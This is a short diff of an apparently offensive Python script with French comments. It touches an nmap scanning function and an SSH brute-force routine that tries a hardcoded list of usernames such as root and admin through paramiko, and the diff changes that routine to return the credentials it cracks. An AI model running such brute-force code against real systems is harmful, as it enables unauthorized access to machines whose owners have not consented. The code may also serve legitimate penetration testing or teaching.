@@ -37,7 +37,7 @@ def run_nmap_scan(ip_address):
     
     return open_tcp_ports, open_udp_ports, services, cves
 
-# Fontion qui execute un bruteforce sur le service SSH
+# Fonction qui exécute un bruteforce sur le service SSH
 def brute_force_ssh(ip):
     usernames = ["debian", "root", "user", "admin"]
     
@@ -52,13 +52,10 @@ def brute_force_ssh(ip):
             try:
                 client.connect(ip, username=username, password=password)
                 print(f"Successful login: {username}:{password}")
-                return
+                return f"{username}:{password}"
             except paramiko.AuthenticationException:
                 continue
-    
     print("Attack unsuccessful")
-
-
 
 
 
